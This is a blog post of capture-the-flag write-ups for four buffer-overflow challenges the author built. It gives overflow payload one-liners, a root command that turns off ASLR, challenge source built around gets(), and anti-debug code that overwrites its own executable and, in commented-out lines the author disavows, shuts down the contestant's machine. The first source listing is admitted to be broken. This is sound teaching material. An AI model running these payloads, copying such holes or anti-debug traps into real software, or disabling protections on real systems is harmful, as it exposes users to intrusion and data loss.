---
layout: post
title: Sp00kyCTF Write ups - Killer Canary 1-4
status: done
type: post
published: true
comments: true
date: 2022-01-02
---

# Overview
As Part of my Cyber security club, I helped put on a Halloween CTF. My contribution was a series of 4 escalating binary exploitation challenges taking the competitor through basic buffer overflows to disabling ASLR, defeating canaries, and either using smart brute forcing or defeating pseudo random numbers to break the last challenge. All of these challenges were meant to be completed without access to the binary and therefor the participants had to work through the binaries to get "debugging" information needed to break the challenge.

Sorce code can be found at https://github.com/hourglass492/sp00ky-killer-canary-challanges
## Killer Canary 1
Solution: `python3 -c "print('A' * 400)" | ./level1`

This is a simple Binary exploitation challenge. You simply have to know what a buffer overflow is and pipe in a massive amount of input into the binary.

The binary catches SEGFAULTs and reveals the flag to you.

//NOTE: this is not the real source, it has been smashed and I have to find my backups for the real one

```C
void segfault_sigaction(int signal, siginfo_t *si, void *arg)

{

 printf("Caught segfault at address %p", si->si_addr);

 printf("The signal is %d ", signal);

 printf("the flag is:");

 FILE *fptr;

 char c;

 while (c != EOF)
 {

 printf ("%c", c);

 c = fgetc(fptr);

 }
  

 exit(0);

}

  

int main(void)

{

 int string[200];

 struct sigaction sa;

  

 memset(&sa, 0, sizeof(struct sigaction));

 sigemptyset(&sa.sa_mask);

 sa.sa_sigaction = segfault_sigaction;

 sa.sa_flags = SA_SIGINFO;

  

 sigaction(SIGSEGV, &sa, NULL);

  

 puts("Input please");

 /* Cause a seg fault */

 gets(string);

 puts("recived: ");

 puts(string);

 puts("thank you :)");

 printf("Return to %p", __builtin_return_address(0));

 return 0;

}
```




## Killer Canary 2

Solution: `python3 -c 'import sys; import struct; val = struct.pack("I", 0xdeadbeef); sys.stdout.buffer.write(b"A" * 32 + val)' | ./level2`

This challenges introduces the idea of a stack canary. The idea is you have to overflow the buffer, like last time, however you have to leave the 

First thing you should do is overflow the buffer again and see what it does. It prints:
```C

main(){


    struct sigaction sa;





    memset(&sa, 0, sizeof(struct sigaction));
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segfault_sigaction;
    sa.sa_flags   = SA_SIGINFO;

    sigaction(SIGSEGV, &sa, NULL);


    struct data data = {
        .yourinput = { 0 },
        .give_flag = 0,
    };

    printf("Input:");
    gets((char*) &data.yourinput);


    puts("
");
    puts((char*) &data.yourinput);

    if (data.give_flag == 0xDEADBEEF) {
        give_flag();

    }
    return 1;
```
also your give flag was 0x41414141

This lets us know that our give flag was 0x41414141, which is the 'A's that we piped in and we see that it has to be 0xdeadbeef. So now it is just a guess and check to see. After a bunch of checking we see that 32 A get you to the give flag input. Then you have to directly write deadbeaf to the program. I use struct.pack in python to do that and then rather then using print I use the sys.stdout.buffer.write because it bypasses all of the internal code for the other ways and lets you output raw bytes.


## Killer 3
 Solution: `python3 -c 'import sys; import struct; val = struct.pack("I", 0xdeadbeef); rVal = struct.pack("I", 0x555552a4); rVal2 = struct.pack("I", 0x00005555); sys.stdout.buffer.write(b"A" * 8 + val + b"A" * 168 + rVal + rVal2)' | ./level3`
 
 
 As before, the first thing we do is try and overflow the buffer and we see we kill the bird again
 

`python3 -c "print('A'*1000)" | ./level3`
> Here's my favorite bird, what do you think his name is:
You killed my birdy, it was 0xdeadbeef but you killed him so now he's 0x41414141
I will make you pay for that


So we do some guess and check to figure out how many A's are needed to overwrite the bird to make it deadbeef again. This happens to be 8 A's and then we output dead beef again to get pass it.

So we run it again overflowing after the canary and get this:

`python3 -c "print('A" * 8 + val + b"A" * 200 + rVal + rVal2)' | ./level3`
> Here's my favorite bird, what do you think his name is:
Oh my birdy likes you: 0xdeadbeef thinks you're a nice person so you can stay for now
Here let me show you to 0x4141414141414141
Caught segfault at address (nil)
You seem to be struggling
Here's a pointer that you may want to check it out: 0x00005555555552a4

We see we are going to 0x4141414141414141 in the code and it tells use we want to go to  0x00005555555552a4. 



Important note: you will only see this if you turn off your aslr on your computer by running the following command as root
`echo 0 > /proc/sys/kernel/randomize_va_space`


At this point you have to create 2 packed structs to get a 8 byte val you and guess and check your way to find the number of bytes after the canary you have to put them. We eventually see that 168 A's are enough after the first overflow and then write in the address we want to go to.


# Killer 4
```Bash
for i in {0..10000}; do python3 -c 'import sys; import struct; val = struct.pack("I", 0x6551677d); rVal = struct.pack("I", 0x555553c6); rVal2 = struct.pack("I", 0x00005555); sys.stdout.buffer.write(b"A" * 12 + val + b"A" * 24 + rVal + rVal2)' | ./level4 | tee -a debug ; sleep 1; done
```

Ok For our first steps lets walk through the program and we get:

`


Welcome victim 2015962150
 hahahahahaha:sgre

I'll remember you said that

You didn't escape, hahahahahahahahahahahaha
 I'll destroy the way out and you'll never escape

well I caught you, any last words?

srg
I'll remember that
 ok bye bye now

Before you die, Do you want to know how I name my birds?? (y/n):
y

```C
get_birdy(int iters){
    srand(1337);
    int i = 0;
    for(i = 0; i < iters; i++) rand();
    contestent_num = (rand() );
    return  (rand());
}

pretty cool right

```

We see a couple of interesting things here. First there seems to be a large number that changes randomly (victim number), then 2 places to give input and then finally there is a snippet of code that generates the "name" of the bird. 


The get_brirdy function uses the stand and rand functions to get the name of the bird, which is pretty interesting. Rand in C is a [[pseudo random number]] generator which means that if we have the seed we know what series of numbers it will produce. Luckally, we can see the seed in this code. The srand function sets the seed of rand to the given value, 1337 in our case. However, we do not know the number of iterations because that is a given to the function. So lets overflow the first input.

`
./level4
Welcome victim 1218289084
 hahahahahaha:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
How dare you, You killed my birdy, sad dead birdy,  
 His name was 0x4fac9884 but you killed him and now it's 0x41414141
You'll never leave here now
`
This doesn't give us too much interesting information so lets also overflow the 2nd input.
`
./level4
Welcome victim 734924384
 hahahahahaha:a

I'll remember you said that

You didn't escape, hahahahahahahahahahahaha
 I'll destroy the way out and you'll never escape


well I caught you, any last words?

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
I'll remember that
 ok bye bye now

You didn't think you could escape here did you
Since you're trying here's a sneek peak at main (I'm still hiding some stuff though)



`
```C

void try_to_escape(){
    srand(time(0));
    struct data data = {
        .yourinput = { 0 },
        .birdy = get_birdy(rand() % 100),
        .give_flag = 0,
    };

    safe_birdy = data.birdy;
    printf("Welcome victim %d\n What are your last words:", contestent_num);
    gets((char*) &data.yourinput);


    puts("\nGood bye :)\n");

    if (data.birdy != safe_birdy) {
        printf("You killed my birdy, sad dead birdy :( \n His name was 0x%x but you killed him and now it's 0x%x\n", safe_birdy, data.birdy);
        if (! debug) exit(1);
    }

    if (data.give_flag) {
        puts("\nMy bird still lives :) so I guess I'll give you one more chance\n");
        printf("To escape you must goto %p", flaggify);
        printf("Now we are going to %p\n will you survive?",  __builtin_return_address(0));
    }

    
}; 

```


Ok this gives us a lot more information to work with, so lets start at the top. We see a call of srand again which is the time. Technically we know what that function is going to return, and because we control the local system we could even set what they time would be. However, that would be a decent amount of work, and not really what my intended solution was as this was supposed to be on a remote server. (However, if you can solve the problem this way that's amazing.) For now, I will treat that as a completely random number.

We only see rand called in one place as a argument to the get_birdy function which we have from before. We also see that it is %100 which lets us know there are only at most 100 possible values for it to take. 

Farther down in the code we see that there is a check to see if the bird is still the same to safe bird which is a global variable stored on the heap so we probably aren't going to be able to change it.

We also see that the contestant number is printed off which was assigned in get_birdy as the rand right before the birdy. This could let us interact with the program to pull the contestant number out, call rand until it reaches that value, and then plug the next value into the birdy to grantee a success on every run. This would probably be called to as the program leaking data and could be used to defeat ALSR if the leaked data was the location of a function. 

Once we overflow the buffer and preserve the canary, it tells us to go to a pointer location and where we are currently going:

`
My bird still lives :) so I guess I'll give you one more chance

To escape you must goto 0x5555555553c6

Now we are going to 0x414141414141414141414141
 will you survive?
`

At this point we simply expirement a little more  to figure out the offset to control the return address of the program and then create 2 structs to overwrite it to the value we want to get the following:

`
My bird still lives :) so I guess I'll give you one more chance

To escape you must goto 0x5555555553c6
Now we are going to 0x5555555553c6
 will you survive?
 Damn you, you escaped with my flag:
 s00ky_ctf{7h3_l0N3_5UrvIv3R_W3ll_d0N3}

`

I was in a rush to make a solution to prove that this was exploitable before the competition, so rather then trying to do something elegant with getting the canary right every time, I simply brute forced it with my bash one liner. Not perfect but it works.

## Behind the Scenes

These challenges were originally meant to be done on a remote server with no access to the binary. However, there were problems setting up the infrastructure so the challenges had to be adapted to allow the competitors to run them locally without making them too easy. 

One of the first things that I always do when trying to solve a binary challenge is to run strings on it and see what pops out and I did not want the flag or any useful hints to pop out. Therefor I XOR encrypted all of the flags and useful information. 

In order to print things therefor, they needed to go through the decryption function:

```C

void give_flag(char toPrint[], int size){

key[2] = 'Q';

puts("\n\n");

key[2] = 'S';

int i;

if (debug)puts("key:");

int j;

check_debug();

for(j =0; j <= sizeof(key); j++){

if (debug) printf("key place %d is %c and in hex %x\n", j, key[j], key[j]);

}

for(i = 0; i < size + 1; i++){

toPrint[i] = toPrint[i] ^ key[i % sizeof(key)];

// printf("0x%x,", toPrint[i]);

}

puts("\n\n");

}
```

and then it can be printed out like normal.

I'll note that this lead to incredibly long char arrays to store the data. For example here's one of the larger ones from level 4:
```C
char main_string[] = {0x3f,0x2e,0x3a,0x23,0x20,0x3d,0x33,0x2a,0x18,0x74,0x26,0x1e,0x36,0x34,0x63,0x28,0x31,0x36,0x6f,0x29,0x32,0x4b,0x73,0x67,0x20,0x69,0x32,0x21,0x26,0x6e,0x2d,0x69,0x27,0x2e,0x6d,0x2c,0x69,0x63,0x6e,0x29,0x72,0x4b,0x73,0x67,0x20,0x69,0x32,0x27,0x35,0x75,0x2a,0x35,0x73,0x23,0x61,0x3d,0x20,0x73,0x23,0x61,0x3d,0x20,0x73,0x7a,0x20,0x32,0x4b,0x73,0x67,0x20,0x69,0x61,0x73,0x67,0x20,0x67,0x38,0x3c,0x32,0x72,0x20,0x2f,0x23,0x32,0x74,0x69,0x7c,0x73,0x3c,0x20,0x79,0x61,0x2e,0x6b,0xa,0x69,0x61,0x73,0x67,0x20,0x69,0x61,0x73,0x69,0x62,0x20,0x33,0x37,0x3e,0x20,0x74,0x61,0x34,0x22,0x74,0x16,0x23,0x3a,0x35,0x64,0x30,0x69,0x21,0x26,0x6e,0x2d,0x69,0x7a,0x67,0x25,0x69,0x70,0x63,0x77,0x29,0x65,0x4b,0x73,0x67,0x20,0x69,0x61,0x73,0x67,0x20,0x67,0x26,0x3a,0x31,0x65,0x16,0x27,0x3f,0x26,0x67,0x69,0x7c,0x73,0x77,0x2c,0x43,0x61,0x73,0x67,0x20,0x34,0x7a,0x59,0x4d,0x20,0x69,0x61,0x73,0x34,0x61,0x2f,0x24,0xc,0x25,0x69,0x3b,0x25,0x2a,0x67,0x3d,0x69,0x25,0x32,0x33,0x61,0x67,0x23,0x3a,0x35,0x64,0x30,0x7a,0x59,0x67,0x20,0x69,0x61,0x23,0x35,0x69,0x27,0x35,0x35,0x6f,0x22,0x1e,0x24,0x3f,0x24,0x6f,0x24,0x24,0x73,0x31,0x69,0x2a,0x35,0x3a,0x2a,0x20,0x6c,0x25,0xf,0x29,0x20,0x1e,0x29,0x32,0x33,0x20,0x28,0x33,0x36,0x67,0x79,0x26,0x34,0x21,0x67,0x6c,0x28,0x32,0x27,0x67,0x77,0x26,0x33,0x37,0x34,0x3a,0x6b,0x6d,0x73,0x24,0x6f,0x27,0x35,0x36,0x34,0x74,0x2c,0x2f,0x27,0x18,0x6e,0x3c,0x2c,0x7a,0x7c,0xa,0x69,0x61,0x73,0x67,0x67,0x2c,0x35,0x20,0x6f,0x28,0x2a,0x29,0x32,0x35,0x2a,0x60,0x61,0x75,0x23,0x61,0x3d,0x20,0x7d,0x3e,0x6f,0x3c,0x33,0x3a,0x29,0x70,0x3c,0x35,0x7a,0x7c,0xa,0x43,0x4b,0x73,0x67,0x20,0x69,0x31,0x26,0x33,0x73,0x61,0x63,0xf,0x29,0x47,0x26,0x2e,0x37,0x67,0x62,0x30,0x24,0x73,0x7d,0x29,0x15,0x2f,0x71,0x6e,0x3b,0x43,0x4b,0x73,0x67,0x20,0x69,0x28,0x35,0x67,0x28,0x2d,0x20,0x27,0x26,0x2e,0x2b,0x28,0x21,0x23,0x79,0x69,0x60,0x6e,0x67,0x73,0x28,0x27,0x36,0x18,0x62,0x20,0x33,0x37,0x3e,0x29,0x69,0x3a,0x59,0x67,0x20,0x69,0x61,0x73,0x67,0x20,0x69,0x31,0x21,0x2e,0x6e,0x3d,0x27,0x7b,0x65,0x59,0x26,0x34,0x73,0x2c,0x69,0x25,0x2d,0x36,0x23,0x20,0x24,0x38,0x73,0x25,0x69,0x3b,0x25,0x2a,0x6b,0x20,0x3a,0x20,0x37,0x67,0x64,0x2c,0x20,0x37,0x67,0x62,0x20,0x33,0x37,0x3e,0x20,0x73,0x69,0x73,0x1b,0x6e,0x69,0x9,0x3a,0x34,0x20,0x27,0x20,0x3e,0x22,0x20,0x3e,0x20,0x20,0x67,0x30,0x31,0x64,0x2b,0x67,0x62,0x3c,0x35,0x73,0x3e,0x6f,0x3c,0x61,0x38,0x2e,0x6c,0x25,0x24,0x37,0x67,0x68,0x20,0x2c,0x73,0x26,0x6e,0x2d,0x61,0x3d,0x28,0x77,0x69,0x28,0x27,0x60,0x73,0x69,0x71,0x2b,0x62,0x78,0x15,0x2f,0x71,0x6b,0x20,0x3a,0x20,0x35,0x22,0x5f,0x2b,0x28,0x21,0x23,0x79,0x65,0x61,0x37,0x26,0x74,0x28,0x6f,0x31,0x2e,0x72,0x2d,0x38,0x7a,0x7c,0xa,0x69,0x61,0x73,0x67,0x20,0x69,0x61,0x73,0x2e,0x66,0x69,0x69,0x72,0x67,0x64,0x2c,0x23,0x26,0x20,0x29,0x69,0x24,0x2b,0x2e,0x74,0x61,0x70,0x7a,0x7c,0xa,0x69,0x61,0x73,0x67,0x7d,0x43,0x4b,0x73,0x67,0x20,0x69,0x28,0x35,0x67,0x28,0x2d,0x20,0x27,0x26,0x2e,0x2e,0x28,0x25,0x22,0x5f,0x2f,0x2d,0x32,0x20,0x29,0x69,0x3a,0x59,0x67,0x20,0x69,0x61,0x73,0x67,0x20,0x69,0x31,0x26,0x33,0x73,0x61,0x63,0xf,0x29,0x4d,0x30,0x61,0x31,0x2e,0x72,0x2d,0x61,0x20,0x33,0x69,0x25,0x2d,0x73,0x2b,0x69,0x3f,0x24,0x20,0x67,0x3a,0x60,0x61,0x20,0x28,0x20,0x0,0x61,0x34,0x32,0x65,0x3a,0x32,0x73,0xe,0x27,0x25,0x2d,0x73,0x20,0x69,0x3f,0x24,0x73,0x3e,0x6f,0x3c,0x61,0x3c,0x29,0x65,0x69,0x2c,0x3c,0x35,0x65,0x69,0x22,0x3b,0x26,0x6e,0x2a,0x24,0xf,0x29,0x22,0x60,0x7a,0x59,0x67,0x20,0x69,0x61,0x73,0x67,0x20,0x69,0x31,0x21,0x2e,0x6e,0x3d,0x27,0x7b,0x65,0x54,0x26,0x61,0x36,0x34,0x63,0x28,0x31,0x36,0x67,0x79,0x26,0x34,0x73,0x2a,0x75,0x3a,0x35,0x73,0x20,0x6f,0x3d,0x2e,0x73,0x62,0x70,0x6b,0x6d,0x73,0x21,0x6c,0x28,0x26,0x34,0x2e,0x66,0x30,0x68,0x68,0x4d,0x20,0x69,0x61,0x73,0x67,0x20,0x69,0x61,0x23,0x35,0x69,0x27,0x35,0x35,0x6f,0x22,0x7,0x2e,0x24,0x67,0x77,0x2c,0x61,0x32,0x35,0x65,0x69,0x26,0x3c,0x2e,0x6e,0x2e,0x61,0x27,0x28,0x20,0x6c,0x31,0xf,0x29,0x20,0x3e,0x28,0x3f,0x2b,0x20,0x30,0x2e,0x26,0x67,0x73,0x3c,0x33,0x25,0x2e,0x76,0x2c,0x7e,0x71,0x6b,0x20,0x69,0x1e,0xc,0x25,0x75,0x20,0x2d,0x27,0x2e,0x6e,0x16,0x33,0x36,0x33,0x75,0x3b,0x2f,0xc,0x26,0x64,0x2d,0x33,0x36,0x34,0x73,0x61,0x71,0x7a,0x6e,0x3b,0x43,0x61,0x73,0x67,0x20,0x34,0x4b,0x59,0x67,0x20,0x69,0x61,0x59,0x3a,0x3b,0x69,0x41,0x7d};
```




On level 4 only I really didn't want people using a debugger to solve it so I did a couple of other things to really deter it. First, the key didn't exist from the beginning, rather it was slowly assembled as so the decryption program could only be called at a particular point in the code and return anything meaningful. 


I also included timing checks throughout the program so that if any code took too long to run (such as if it stopped due to a break point), the code would then shut down the computer and yell at the programmer. In retrospect this was a poor choice on my part and a violation of the trust the competitors placed in me and I would not do it again. CTF participants expect the code they run not to negatively effect them and turning off a computer unexpectedly could cause data corruption as was probably pushing it too far.

The other thing the anti debugger did was over write the actual executable with a string so that the competitor would have to re download it. 

```C
void check_debug(){

time_t diff = difftime( time(0), start);

//printf("Time to get here %d\n", diff);

if(diff > 3){

puts("naughty naughty it looks like you are using a debugger prepare to die\n");

int i;

for(i=0; i < sizeof(key); i++)

key[i] |= 0xff;

for(i=0; i < sizeof(flag); i++)

flag[i] |= 0xff;

char tempBuff[200];

sprintf(tempBuff, "/usr/bin/sleep 1 && /usr/bin/echo 'do not use a debugger' > '%s' & ", name);

system(tempBuff);

//THESE WERE A BAD CHOICE, DO NOT REPLICATE
//system("/usr/bin/sleep 1 && /usr/sbin/poweroff &");
//system("/usr/bin/sleep 1 && /usr/sbin/reboot &");

exit(1);

}

}
```
